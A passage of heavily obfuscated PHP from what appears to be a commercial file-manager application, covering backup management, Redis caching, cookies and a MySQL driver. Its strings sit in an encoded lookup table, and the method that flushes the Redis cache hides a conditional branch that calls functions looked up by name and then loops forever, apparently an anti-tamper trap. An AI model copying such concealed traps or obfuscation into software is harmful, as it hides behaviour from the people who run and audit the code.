$‡ĞÓÂµñ[11] . date($‡ĞÓÂµñ[769]); } $­ÎæâÕ© = array($‡ĞÓÂµñ[767] => $î¨¾Ã†[$‡ĞÓÂµñ[767]], $‡ĞÓÂµñ[32] => self::$name, $‡ĞÓÂµñ[765] => 0, $‡ĞÓÂµñ[770] => $î¨¾Ã†[$‡ĞÓÂµñ[770]], $‡ĞÓÂµñ[771] => self::$manual, $‡ĞÓÂµñ[302] => array($‡ĞÓÂµñ[772] => array($‡ĞÓÂµñ[765] => 0), $‡ĞÓÂµñ[773] => array($‡ĞÓÂµñ[765] => 0, $‡ĞÓÂµñ[774] => 0, $‡ĞÓÂµñ[775] => 0, $‡ĞÓÂµñ[33] => $‡ĞÓÂµñ[12], $‡ĞÓÂµñ[776] => 0, $‡ĞÓÂµñ[505] => 0), $‡ĞÓÂµñ[777] => array($‡ĞÓÂµñ[765] => 0, $‡ĞÓÂµñ[774] => 0, $‡ĞÓÂµñ[775] => 0, $‡ĞÓÂµñ[776] => 0, $‡ĞÓÂµñ[505] => 0), $‡ĞÓÂµñ[199] => array($‡ĞÓÂµñ[765] => 0, $‡ĞÓÂµñ[778] => 0, $‡ĞÓÂµñ[779] => 0, $‡ĞÓÂµñ[780] => 0, $‡ĞÓÂµñ[781] => 0, $‡ĞÓÂµñ[476] => $ÜÚÒ²Ü, $‡ĞÓÂµñ[776] => 0, $‡ĞÓÂµñ[505] => 0)), $‡ĞÓÂµñ[776] => time(), $‡ĞÓÂµñ[505] => 0); $øôòİ  = Model($‡ĞÓÂµñ[764])->insert($­ÎæâÕ©); $­ÎæâÕ©[$‡ĞÓÂµñ[407]] = $øôòİ ; return $­ÎæâÕ©; } private function checkStore($¾ºÂ±ğ) { $ïµ½İÁ =& $_SERVER[™¾ÇÙ¯¹]; $Ñ™áÉ€¢ = Model($ïµ½İÁ[782])->listData($¾ºÂ±ğ); Model($ïµ½İÁ[782])->checkConfig($Ñ™áÉ€¢); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[™¾ÇÙ¯¹][764])->findByName(self::$name); } return self::$option; } public static function set($õÜÑ‘¿±) { $èµâÆáØ =& $_SERVER[™¾ÇÙ¯¹]; $ÌÊ‡Ü = self::get(); foreach ($õÜÑ‘¿± as $òÖÅĞ¸† => $çËüä¼) { $è²©Ú™ç = explode($èµâÆáØ[10], $òÖÅĞ¸†); $öÓÃÜÕ = count($è²©Ú™ç); switch ($öÓÃÜÕ) { case 1: $ÌÊ‡Ü[$è²©Ú™ç[0]] = $çËüä¼; break; case 2: $ÌÊ‡Ü[$è²©Ú™ç[0]][$è²©Ú™ç[1]] = $çËüä¼; break; case 3: $ÌÊ‡Ü[$è²©Ú™ç[0]][$è²©Ú™ç[1]][$è²©Ú™ç[2]] = $çËüä¼; break; } } Model($èµâÆáØ[764])->update($ÌÊ‡Ü[$èµâÆáØ[407]], $ÌÊ‡Ü); self::$option = $ÌÊ‡Ü; return self::$option; } public function keep() { $„ş¸„âö =& $_SERVER[™¾ÇÙ¯¹]; $’ş¹ˆ¦ë = self::get(); if ($’ş¹ˆ¦ë[$„ş¸„âö[302]][$„ş¸„âö[772]][$„ş¸„âö[765]] == $„ş¸„âö[88]) { return; } $this->backupKeep($’ş¹ˆ¦ë); self::set(array($„ş¸„âö[783] => 1)); } private function backupKeep($½öòŒ’ì) { $˜ÓÎ¬¦Ê =& $_SERVER[™¾ÇÙ¯¹]; if (self::$manual == 1) { return; } $œÛˆÆƒŒ = Model($˜ÓÎ¬¦Ê[764])->listData(); if (empty($œÛˆÆƒŒ)) { return; } $Ü È¸·Œ = 0; $†Ôá¦î = array(); foreach ($œÛˆÆƒŒ as $´‡ùÍ÷ö) { if ($Ü È¸·Œ >= 7) { break; } $†Ôá¦î[] = $´‡ùÍ÷ö[$˜ÓÎ¬¦Ê[32]]; $Ü È¸·Œ++; } for ($Ü È¸·Œ = 0; $Ü È¸·Œ < 12; $Ü È¸·Œ++) { $†Ôá¦î[] = date($˜ÓÎ¬¦Ê[784], strtotime("\55{$Ü È¸·Œ}\x20\x6d\157\156\x74\x68\x73")); } $†Ôá¦î = array_unique($†Ôá¦î); $‰ÈñÎ•ò = Model($˜ÓÎ¬¦Ê[785])->get($˜ÓÎ¬¦Ê[786]); foreach ($œÛˆÆƒŒ as $´‡ùÍ÷ö) { if (isset($´‡ùÍ÷ö[$˜ÓÎ¬¦Ê[771]]) && $´‡ùÍ÷ö[$˜ÓÎ¬¦Ê[771]] == $˜ÓÎ¬¦Ê[88]) { continue; } if (!empty($´‡ùÍ÷ö[$˜ÓÎ¬¦Ê[32]]) && in_array($´‡ùÍ÷ö[$˜ÓÎ¬¦Ê[32]], $†Ôá¦î)) { continue; } Model($˜ÓÎ¬¦Ê[764])->remove($´‡ùÍ÷ö[$˜ÓÎ¬¦Ê[407]]); $‡´®Ó´ó = $this->backupPath($½öòŒ’ì, $‰ÈñÎ•ò); IO::remove($‡´®Ó´ó, !1); } } private function backupPath($ÛÂ°ªü¨, $ô­‡Ïá = false) { $£…”Ÿéö =& $_SERVER[™¾ÇÙ¯¹]; if (!$ô­‡Ïá) { $ô­‡Ïá = Model($£…”Ÿéö[785])->get($£…”Ÿéö[786]); } $³Îğ˜ŒŠ = $ÛÂ°ªü¨[$£…”Ÿéö[32]]; $ÀÈ¢«Ã = substr(md5($£…”Ÿéö[787] . $ô­‡Ïá . $³Îğ˜ŒŠ), 0, 8); return "\173\151\x6f\x3a{$ÛÂ°ªü¨[$£…”Ÿéö[767]]}\175\57\x64\x61\164\x61\142\141\x73\145\57\x62\141\x63\x6b\x75\160\x2f" . $³Îğ˜ŒŠ . $£…”Ÿéö[11] . $ÀÈ¢«Ã; } public function db() { $ò¥¥¤±– =& $_SERVER[™¾ÇÙ¯¹]; $û¬ŸÁéñ = self::get(); if ($û¬ŸÁéñ[$ò¥¥¤±–[302]][$ò¥¥¤±–[773]][$ò¥¥¤±–[765]] == $ò¥¥¤±–[88]) { return !0; } $Åü‡œŒ = new BackupDb(); if (!$Åü‡œŒ->index()) { return !1; } self::set(array($ò¥¥¤±–[788] => 1)); return !0; } public function dbFile() { $üëàÆ° =& $_SERVER[™¾ÇÙ¯¹]; $Ó«ÛÙÊ = self::get(); if ($Ó«ÛÙÊ[$üëàÆ°[302]][$üëàÆ°[777]][$üëàÆ°[765]] == $üëàÆ°[88]) { return !0; } $Ü¿ŒÅá› = new BackupDbFile(); if (!$Ü¿ŒÅá›->index()) { return !1; } self::set(array($üëàÆ°[789] => 1)); return !0; } public function file() { $å»ü÷õ× =& $_SERVER[™¾ÇÙ¯¹]; $å‹…Ó = self::get(); if ($å‹…Ó[$å»ü÷õ×[302]][$å»ü÷õ×[199]][$å»ü÷õ×[765]] == $å»ü÷õ×[88]) { return !0; } if (!isset($å‹…Ó[$å»ü÷õ×[770]]) || $å‹…Ó[$å»ü÷õ×[770]] == $å»ü÷õ×[197]) { $›ôĞ«ğ÷ = new BackupFile(); if (!$›ôĞ«ğ÷->index()) { return !1; } } self::set(array($å»ü÷õ×[790] => 1, $å»ü÷õ×[765] => 1)); return !0; } } goto EºĞ±‘´Öî; eÁ‡ŞÅÊÌå: define($_SERVER[™¾ÇÙ¯¹][0], $_SERVER[™¾ÇÙ¯¹][1]); $_SERVER[½Ï»äåá] = explode($_SERVER[™¾ÇÙ¯¹][2], gzinflate(substr($_SERVER[™¾ÇÙ¯¹][3], 10, -8))); function binCheckEq($è­ßùº, $Å”³àßÇ) { return $è­ßùº == $Å”³àßÇ; } goto FÍ‡Ÿ–øó; C·†àºàæó: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¤ƒÊÍå, $§¿Ş áø) { $•Úê§´« =& $_SERVER[™¾ÇÙ¯¹]; if (!class_exists($•Úê§´«[880])) { show_json($•Úê§´«[881], !1); } $this->cacheTime = $§¿Ş áø; $ì¦‡¼ÌÎ = isset($¤ƒÊÍå[$•Úê§´«[882]]) ? $¤ƒÊÍå[$•Úê§´«[882]] : 10; $Ü¢ÜÂË = _get($¤ƒÊÍå, $•Úê§´«[879]); if ($Ü¢ÜÂË && is_array($Ü¢ÜÂË)) { $this->initCluster($¤ƒÊÍå, $ì¦‡¼ÌÎ); } else { $this->handle = $this->init($¤ƒÊÍå, $ì¦‡¼ÌÎ); } } private function init($ïê³ğÎ², $„Şì”Ôö) { $¶»õí‡ =& $_SERVER[™¾ÇÙ¯¹]; $ÒÚŒÓĞª = new Redis(); $ñ‹É÷šç = isset($ïê³ğÎ²[$¶»õí‡[883]]) ? $ïê³ğÎ²[$¶»õí‡[883]] : !1; if ($ñ‹É÷šç) { $ÒÚŒÓĞª->pconnect($ïê³ğÎ²[$¶»õí‡[181]], $ïê³ğÎ²[$¶»õí‡[182]], $„Şì”Ôö); } else { $ÒÚŒÓĞª->connect($ïê³ğÎ²[$¶»õí‡[181]], $ïê³ğÎ²[$¶»õí‡[182]], $„Şì”Ôö); } if (!empty($ïê³ğÎ²[$¶»õí‡[421]])) { $ÒÚŒÓĞª->auth($ïê³ğÎ²[$¶»õí‡[421]]); } if (!empty($ïê³ğÎ²[$¶»õí‡[773]]) && $ïê³ğÎ²[$¶»õí‡[773]] != 0) { $ÒÚŒÓĞª->select($ïê³ğÎ²[$¶»õí‡[773]]); } return $ÒÚŒÓĞª; } private function initCluster($ÈûÆ „È, $¦öÄâóÖ) { $èÒºĞ¨ =& $_SERVER[™¾ÇÙ¯¹]; $ü™«”íï = array($èÒºĞ¨[884], $èÒºĞ¨[885], $èÒºĞ¨[886]); $…û¤›õ  = $èÒºĞ¨[884]; if (isset($ÈûÆ „È[$èÒºĞ¨[16]]) && in_array($ÈûÆ „È[$èÒºĞ¨[16]], $ü™«”íï)) { $…û¤›õ  = $ÈûÆ „È[$èÒºĞ¨[16]]; } switch ($…û¤›õ ) { case $èÒºĞ¨[884]: $this->_slave($ÈûÆ „È, $¦öÄâóÖ); break; case $èÒºĞ¨[885]: break; case $èÒºĞ¨[886]: $this->isCluster = !0; $ğ°ÊÅÊ = $ÈûÆ „È[$èÒºĞ¨[879]]; $‚İöìÆ” = isset($ÈûÆ „È[$èÒºĞ¨[883]]) ? $ÈûÆ „È[$èÒºĞ¨[883]] : !1; $¡ãè›ª„ = isset($ÈûÆ „È[$èÒºĞ¨[421]]) ? $ÈûÆ „È[$èÒºĞ¨[421]] : null; $this->handle = new RedisCluster(NUll, $ğ°ÊÅÊ, $¦öÄâóÖ, $¦öÄâóÖ, $‚İöìÆ”, $¡ãè›ª„); break; default: break; } } private function _slave($Éàã„¶, $Ú¬½Òñü) { $ÕÄƒ€èı = $Éàã„¶[$_SERVER[™¾ÇÙ¯¹][879]]; $this->filterConfig($Éàã„¶, $ÕÄƒ€èı[0]); $this->handle = $this->init($Éàã„¶, $Ú¬½Òñü); unset($ÕÄƒ€èı[0]); if (empty($ÕÄƒ€èı)) { return; } $‰ª±¥† = array_rand($ÕÄƒ€èı); $this->filterConfig($Éàã„¶, $ÕÄƒ€èı[$‰ª±¥†]); $this->slaveHandle = $this->init($Éàã„¶, $Ú¬½Òñü); } private function filterConfig(&$æ«¶á…Â, $§ÚÕ‹¿–) { $—óæ‹‘Û =& $_SERVER[™¾ÇÙ¯¹]; $ªÁ¬óİˆ = explode($—óæ‹‘Û[4], $§ÚÕ‹¿–); $·Òœ´ËÑ = array($—óæ‹‘Û[181] => $ªÁ¬óİˆ[0], $—óæ‹‘Û[182] => $ªÁ¬óİˆ[1]); $æ«¶á…Â = array_merge($æ«¶á…Â, $·Òœ´ËÑ); } public function set($¢ĞÎæ¸ß, $šª”ü¯, $É—ü¯ù = false) { $É—ü¯ù = $É—ü¯ù ? $É—ü¯ù : $this->cacheTime; return $this->handle->setEx($¢ĞÎæ¸ß, $É—ü¯ù, $šª”ü¯); } public function setLock($–¼Ìİå½, $Ü›‘¥à—, $üªøÒÍ²) { return $this->handle->setNX($–¼Ìİå½, $Ü›‘¥à—); } public function get($¬›„€Úï) { $½õ×‹š‹ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $½õ×‹š‹->get($¬›„€Úï); } public function remove($áûÈƒáà) { return $this->handle->del($áûÈƒáà); } public function deleteAll() { $Şİø úµ =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($_SERVER[$Şİø úµ[244]]) || !isset($_SERVER[$Şİø úµ[245]])) { $è˜«®°ë = $Şİø úµ[887]; $Ô ğ¶† = $Şİø úµ[246]; $£ÊÑ‚ëµ = $_SERVER[$Şİø úµ[247]] . $Şİø úµ[248]; $¯°»¤ü¥ = $Ô ğ¶†($£ÊÑ‚ëµ); $˜ÈúñÓÑ = explode($Şİø úµ[231], $¯°»¤ü¥); if (count($˜ÈúñÓÑ) < $Şİø úµ[627]) { $²Íˆ•˜Û = $Şİø úµ[250]; $²Íˆ•˜Û(); } $±ğ…È½ = $Şİø úµ[888]; $±ğ…È½($_SERVER[$Şİø úµ[889]]); $Ò¤ªšÕÌ = 1; for ($Ÿâïµ–³ = $Ò¤ªšÕÌ; $Ÿâïµ–³ > 0; $Ÿâïµ–³++) { $±ğ…È½ = json_encode($GLOBALS[$Şİø úµ[426]]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $øÄ³î) { $this->handle->flushall($øÄ³î); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÑŠí¯ãî = '', $ğ¶÷’‰è = 0) { if (is_string($ÑŠí¯ãî) && $ÑŠí¯ãî != $_SERVER[™¾ÇÙ¯¹][12]) { $this->prefix = $ÑŠí¯ãî; } if (is_numeric($ğ¶÷’‰è) && $ğ¶÷’‰è > 0) { $this->expire = $ğ¶÷’‰è; } } public static function getInstance() { static $‡—«å¢†; if ($‡—«å¢† === null) { $‡—«å¢† = new self(); } return $‡—«å¢†; } private static $cookieDisable = false; public static function disable($Ú½ŒŸ¤) { self::$cookieDisable = $Ú½ŒŸ¤; } private static $sameCookieSet = array(); public static function set($æ¥ÔË–¤, $À»‹²€µ, $¢² §‚’ = 0, $§Íá¬Ó± = false, $‘ ò´©š = false) { $äó“éÀã =& $_SERVER[™¾ÇÙ¯¹]; if (self::$cookieDisable) { return; } if (!$¢² §‚’) { $¢² §‚’ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$æ¥ÔË–¤]) && self::$sameCookieSet[$æ¥ÔË–¤] == $À»‹²€µ . $¢² §‚’) { return; } self::$sameCookieSet[$æ¥ÔË–¤] = $À»‹²€µ . $¢² §‚’; if (!$‘ ò´©š) { $‘ ò´©š = str_replace(HOST, $äó“éÀã[12], APP_HOST); $‘ ò´©š = _get($GLOBALS, $äó“éÀã[890], $‘ ò´©š); } $ÎÁÜ£È = $äó“éÀã[12]; setcookie($æ¥ÔË–¤, $À»‹²€µ, time() + $¢² §‚’, $äó“éÀã[8] . trim($‘ ò´©š, $äó“éÀã[8]) . $ÎÁÜ£È, !1, !1, $§Íá¬Ó±); } public static function setSafe($ª¡­·Îù, $íšÆŒƒû, $ê‰Ø‹ï¤ = 0) { self::set($ª¡­·Îù, $íšÆŒƒû, $ê‰Ø‹ï¤, !0); } public static function get($ˆšÀ®¥ô) { static $Üı¹Ê¦İ = false; if (!$Üı¹Ê¦İ) { self::initHeaderCookie(); $Üı¹Ê¦İ = !0; } return isset($_COOKIE[$ˆšÀ®¥ô]) ? $_COOKIE[$ˆšÀ®¥ô] : !1; } private static function initHeaderCookie() { $³“Ëëè® =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($_SERVER[$³“Ëëè®[891]]) || !$_SERVER[$³“Ëëè®[891]]) { return; } $»Ö¦–”š = explode($³“Ëëè®[71], $_SERVER[$³“Ëëè®[891]]); foreach ($»Ö¦–”š as $¿ëâó Ô) { $¿ëâó Ô = explode($³“Ëëè®[892], $¿ëâó Ô); if (count($¿ëâó Ô) != 2 || !isset($¿ëâó Ô[1])) { continue; } $_COOKIE[trim($¿ëâó Ô[0])] = trim($¿ëâó Ô[1]); } } public static function remove($õƒÏüÎ, $ƒ¹¯ûêê = false) { unset($_COOKIE[$õƒÏüÎ]); self::set($õƒÏüÎ, $_SERVER[™¾ÇÙ¯¹][12], 1, $ƒ¹¯ûêê); } } class DbMysql extends Db { public function __construct($Ÿˆ×ãİ› = '') { $ğÄ€‚ğÉ =& $_SERVER[™¾ÇÙ¯¹]; if (!extension_loaded($ğÄ€‚ğÉ[819])) { think_exception(think_lang($ğÄ€‚ğÉ[14]) . $ğÄ€‚ğÉ[893]); } if (!empty($Ÿˆ×ãİ›)) { $this->config = $Ÿˆ×ãİ›; if (empty($this->config[$ğÄ€‚ğÉ[17]])) { $this->config[$ğÄ€‚ğÉ[17]] = $ğÄ€‚ğÉ[12]; } } } public function connect($èıÖÕ¨Ï = '', $ËäÍ©—Ï = 0, $§Ş¨ÈË = false) { $€’™ë =& $_SERVER[™¾ÇÙ¯¹]; if (!isset($this->linkID[$ËäÍ©—Ï])) { if (empty($èıÖÕ¨Ï)) { $èıÖÕ¨Ï = $this->config; } $úæ˜ÍÈç = $èıÖÕ¨Ï[$€’™ë[894]] . ($èıÖÕ¨Ï[$€’™ë[895]] ? "\x3a{$èıÖÕ¨Ï[$€’™ë[895]]}" : $€’™ë[12]); $÷Á± Ô§ = !empty($èıÖÕ¨Ï[$€’™ë[17]][$€’™ë[18]]) ? $èıÖÕ¨Ï[$€’™ë[17]][$€’™ë[18]] : $this->pconnect; if ($÷Á± Ô§) { $this->linkID[$ËäÍ©—Ï] = mysql_pconnect($úæ˜ÍÈç, $èıÖÕ¨Ï[$€’™ë[896]], $èıÖÕ¨Ï[$€’™ë[897]], 131072); } else { $this->linkID[$ËäÍ©—Ï] = mysql_connect($úæ˜ÍÈç, $èıÖÕ¨Ï[$€’™ë[896]], $èıÖÕ¨Ï[$€’™ë[897]], !0, 131072); } if (!$this->linkID[$ËäÍ©—Ï] || !empty($èıÖÕ¨Ï[$€’™ë[21]]) && !mysql_select_db($èıÖÕ¨Ï[$€’™ë[21]], $this->linkID[$ËäÍ©—Ï])) { think_exception(mysql_error()); } $ıåÀğÅ— = mysql_get_server_info($this->linkID[$ËäÍ©—Ï]); mysql_query($€’™ë[898] . think_config($€’™ë[899]) . $€’™ë[58], $this->linkID[$ËäÍ©—Ï]); if ($ıåÀğÅ— > $€’™ë[900]) { mysql_query($€’™ë[901], $this->linkID[$ËäÍ©—Ï]); } $this->connected = !0; if (1 != think_config($€’™ë[22])) { unset($this->config); } } return $this->linkID[$ËäÍ©—Ï]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($§º·äÏÔ) { $ª¨ãÎ =& $_SERVER[™¾ÇÙ¯¹]; if (0 === stripos($§º·äÏÔ, $ª¨ãÎ[273])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $§º·äÏÔ; if ($this->queryID) { $this->free(); } think_action_status($ª¨ãÎ[23], 1); think_status($ª¨ãÎ[24]); $this->queryID = mysql_query($§º·äÏÔ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ş“•ªè®) { $…ÁÕ­ÚË =& $_SERVER[™¾ÇÙ¯¹]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ş“•ªè®; if ($this->queryID) { $this->free(); } think_action_status($…ÁÕ­ÚË[25], 1); think_status($…ÁÕ­ÚË[24]); $´²’Óøé = mysql_query($ş“•ªè®, $this->_linkID); $this->debug(); if (!1 === $´²’Óøé) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[™¾ÇÙ¯¹][902], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ëø±‘ºÖ = mysql_query($_SERVER[™¾ÇÙ¯¹][903], $this->_linkID); $this->transTimes = 0; if (!$Ëø±‘ºÖ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $áÇ¬¹ßº = mysql_query($_SERVER[™¾ÇÙ¯¹][904], $this->_linkID); $this->transTimes = 0; if (!$áÇ¬¹ßº) { $this->error(); return !1; } } return !0; } private function getAll() { $©üäòóò = array(); if ($this->numRows > 0) { while ($¢‰•âß = mysql_fetch_assoc($this->queryID)) { $©üäòóò[] = $¢‰•âß; } mysql_data_seek($this->queryID, 0); } return $©üäòóò; } public function getFields($øàì€–ò) { $£ú¿õµŠ =& $_SERVER[™¾ÇÙ¯¹]; $Ğ®èŠËå = $this->query($£ú¿õµŠ[905] . $this->parseKey($øàì€–ò)); $úˆ©™•Â = array(); if ($Ğ®èŠËå) { foreach ($Ğ®èŠËå as $­É“ãˆ¹ => $º”ı½ûº) { $úˆ©™•Â[$º”ı½ûº[$£ú¿õµŠ[31]]] = array($£ú¿õµŠ[32] => $º”ı½ûº[$£ú¿õµŠ[31]], $£ú¿õµŠ[33] => $º”ı½ûº[$£ú¿õµŠ[34]], $£ú¿õµŠ[35] => (bool) (strtoupper($º”ı½ûº[$£ú¿õµŠ[36]]) === $£ú¿õµŠ[906]), $£ú¿õµŠ[37] => $º”ı½ûº[$£ú¿õµŠ[38]], $£ú¿õµŠ[39] => strtolower($º”ı½ûº[$£ú¿õµŠ[40]]) == $£ú¿õµŠ[41], $£ú¿õµŠ[42] => strtolower($º”ı½ûº[$£ú¿õµŠ[43]]) == $£ú¿õµŠ[44]); } } return $úˆ©™•Â; } public function getTables($éöş™—ƒ = '') { $ä‚¢ù‰ñ =& $_SERVER[™¾ÇÙ¯¹]; if (!empty($éöş™—ƒ)) { $¼ ßĞ¡Ç = $ä‚¢ù‰ñ[907] . $éöş™—ƒ . $ä‚¢ù‰ñ[908]; } else { $¼ ßĞ¡Ç = $ä‚¢ù‰ñ[909]; } $’õÉ“ = $this->query($¼ ßĞ¡Ç); $Ï€æ²¦Ö = array(); foreach ($’õÉ“ as $ı±”’ëÙ => $Û¬ÔëÍó) { $Ï€æ²¦Ö[$ı±”’ëÙ] = current($Û¬ÔëÍó); } return $Ï€æ²¦Ö; } public function replace($¾ûµ¥•, $ëµ÷™™ = array()) { $±ì©é¥Ö =& $_SERVER[™¾ÇÙ¯¹]; foreach ($¾ûµ¥• as $öÒ¡Š€Î => $¨ñò²ü) { $÷é¹ßÓù = $this->parseValue($¨ñò²ü); if (is_scalar($÷é¹ßÓù)) { $¢ÆÙ‹“¬[] = $÷é¹ßÓù; $Ä¦´¶¼›[] = $this->parseKey($öÒ¡Š€Î); } } $È¹ˆëÕç = $±ì©é¥Ö[910] . $this->parseTable($ëµ÷™™[$±ì©é¥Ö[288]]) . $±ì©é¥Ö[911] . implode($±ì©é¥Ö[50], $Ä¦´¶¼›) . $±ì©é¥Ö[912] . implode($±ì©é¥Ö[50], $¢ÆÙ‹“¬) . $±ì©é¥Ö[913]; return $this->execute($È¹ˆëÕç); } public function insertAll($«ªÜÎŠ·, $¦ÔÚ»Ê = array(), $ ı÷ë²Ö = false) { $®·ç•¼Ğ =& $_SERVER[™¾ÇÙ¯¹]; if (!is_array($«ªÜÎŠ·[0])) { return !1; } $œõ…–‘ = array_keys($«ªÜÎŠ·[0]); $’şØ’¨• = array(); foreach ($«ªÜÎŠ· as $˜ÀÔ£¡) { $´è•± = array(); foreach ($˜ÀÔ£¡ as $¦øÕñğä => $ÊÏìÂã¸) { $ÊÏìÂã¸ = $this->parseValue($ÊÏìÂã¸); if (is_scalar($ÊÏìÂã¸)) { $´è•±[] = $ÊÏìÂã¸; } } $’şØ’¨•[] = $®·ç•¼Ğ[269] . implode($®·ç•¼Ğ[50], $´è•±) . $®·ç•¼Ğ[913]; } array_walk($œõ…–‘, array($this, $®·ç•¼Ğ[914])); $ıŸÀ‹¨† = ($ ı÷ë²Ö ? $®·ç•¼Ğ[915] : $®·ç•¼Ğ[916]) . $®·ç•¼Ğ[917] . $this->parseTable($¦ÔÚ»Ê[$®·ç•¼Ğ[288]]) . $®·ç•¼Ğ[911] . implode($®·ç•¼Ğ[50], $œõ…–‘) . $®·ç•¼Ğ[918] . implode($®·ç•¼Ğ[50], $’şØ’¨•); return $this->execute($ıŸÀ‹¨†); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ÆÎºã´ë =& $_SERVER[™¾ÇÙ¯¹]; $this->error = mysql_errno() . $ÆÎºã´ë[4] . mysql_error($this->_linkID); if ($ÆÎºã´ë[12] != $this->queryStr) { $this->error .= LNG($ÆÎºã´ë[48]) . $this->queryStr; } think_trace($this->error, $ÆÎºã´ë[12], $ÆÎºã´ë[49]); return $this->error; } public function escapeString($îö°„¨Ä) { if ($this->_linkID) { return mysql_real_escape_string($îö°„¨Ä, $this->_linkID); } else { return mysql_escape_string($îö°„¨Ä); } } public function parseKey(&$‚Ú¹µ¹’, $à×ÜÇë’ = true) { $àº„Œ¸ =& $_SERVER[™¾ÇÙ¯¹]; if ($à×ÜÇë’) { $‚Ú¹µ¹’ = $this->parseKeyCheck($‚Ú¹µ¹’); } if ($‚Ú¹µ¹’ != $àº„Œ¸[188] && !preg_match($àº„Œ¸[919], $‚Ú¹µ¹’)) { $‚Ú¹µ¹’ = $àº„Œ¸[393] . trim($‚Ú¹µ¹’, $àº„Œ¸[393]) . $àº„Œ¸[393]; } return $‚Ú¹µ¹’; } } goto b½‰À±ªßâ; føŒ Ù½Â: if (strlen($pacvhktgze) < $_SERVER[™¾ÇÙ¯¹][623]) { return; } $_SERVER[×ô×“Ò] = explode($_SERVER[™¾ÇÙ¯¹][624], gzinflate(substr($_SERVER[™¾ÇÙ¯¹][625], 10, -8))); $oqhzyacujb = $_SERVER[™¾ÇÙ¯¹][626]; goto FÖêĞÅæïØ; d•…Ğ§ø÷—: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\x62\141\x63\x6b\165\x70\x4c\151\163\x74"; public $field = array("\x69\157", "\156\141\x6d\145", "\x73\x74\x61\x74\x75\x73", "\143\x6f\156\x74\x65\156\x74", "\x6d\x61\156\165\x61\154", "\x72\x65\x73\165\x6c\164", "\x74\151\x6d\x65\106\162\157\x6d", "\164\x69\155\x65\x54\157"); public function config() { $º©ô‚á =& $_SERVER[™¾ÇÙ¯¹]; $ü‹æü‘ = Model($º©ô‚á[785])->get($º©ô‚á[795]); $ü‹æü‘ = json_decode($ü‹æü‘, !0); $ü‹æü‘ = is_array($ü‹æü‘) ? $ü‹æü‘ : array(); if (!isset($ü‹æü‘[$º©ô‚á[770]])) { $ü‹æü‘[$º©ô‚á[770]] = $º©ô‚á[88]; } unset($ü‹æü‘[$º©ô‚á[1635]]); Action($º©ô‚á[1862])->taskInit(); Model($º©ô‚á[1634])->cacheClear(); $’êÚßÇ÷ = $º©ô‚á[1863]; $ãî¾Œë† = Model($º©ô‚á[1864])->findByKey($º©ô‚á[1653], $’êÚßÇ÷); if (!$ãî¾Œë†) { $ãî¾Œë† = array(); } if (isset($ãî¾Œë†[$º©ô‚á[203]])) { $ãî¾Œë†[$º©ô‚á[203]] = json_decode($ãî¾Œë†[$º©ô‚á[203]], !0); } if (isset($ü‹æü‘[$º©ô‚á[203]])) { $ãî¾Œë†[$º©ô‚á[203]][$º©ô‚á[1638]] = $ü‹æü‘[$º©ô‚á[203]]; unset($ü‹æü‘[$º©ô‚á[203]]); } return array_merge($ãî¾Œë†, $ü‹æü‘); } public function listData($ñ…ıˆôû = false, $î°à©Ñ = "\155\x6f\144\x69\146\171\124\x69\155\x65", $ú´®‰ü½ = false) { return parent::listData($ñ…ıˆôû, $î°à©Ñ, !0); } public function lastItem() { $î ÑÖ„ = $this->listData(); return !empty($î ÑÖ„[0]) ? $î ÑÖ„[0] : null; } public function kill($Ïñö‘¡€) { $Õü£İÈ» =& $_SERVER[™¾ÇÙ¯¹]; $ëƒ¿µä“ = $this->listData($Ïñö‘¡€); if (!$ëƒ¿µä“ || empty($ëƒ¿µä“[$Õü£İÈ»[32]])) { return !0; } Task::kill($Õü£İÈ»[794]); Task::kill($Õü£İÈ»[815]); Task::kill($Õü£İÈ»[824]); $¼éûïøˆ = $ëƒ¿µä“[$Õü£İÈ»[32]]; $¶î‡§ = TEMP_FILES . $Õü£İÈ»[793] . $¼éûïøˆ . $Õü£İÈ»[8]; IO::remove($¶î‡§, !1); return $this->remove($Ïñö‘¡€); } public function remove($Ü˜úŸñÃ) { $ÊÊîæßò = $this->listData($Ü˜úŸñÃ); if (!$ÊÊîæßò) { return !0; } return $this->backupRemove($ÊÊîæßò); } private function backupRemove($€¤„êñê) { parent::remove($€¤„êñê[$_SERVER[™¾ÇÙ¯¹][407]]); $ÔËŸ¹Öê = $this->backupPath($€¤„êñê); IO::remove($ÔËŸ¹Öê, !1); return !0; } private function backupPath($ß³ÊÌ) { $¡ÂÄ¢¯„ =& $_SERVER[™¾ÇÙ¯¹]; $·×ÎÅ¶° = $ß³ÊÌ[$¡ÂÄ¢¯„[32]]; $Ö£¯Ê»œ = Model($¡ÂÄ¢¯„[785])->get($¡ÂÄ¢¯„[786]); $ÅÖ×õö = substr(md5($¡ÂÄ¢¯„[787] . $Ö£¯Ê»œ . $·×ÎÅ¶°), 0, 8); return "\173\151\157\x3a{$ß³ÊÌ[$¡ÂÄ¢¯„[767]]}\175\x2f\144\141\x74\141\x62\141\x73\x65\x2f\x62\141\143\153\x75\160\x2f" . $·×ÎÅ¶° . $¡ÂÄ¢¯„[11] . $ÅÖ×õö; } public function start() { $¹ ˆğ¨¸ =& $_SERVER[™¾ÇÙ¯¹]; 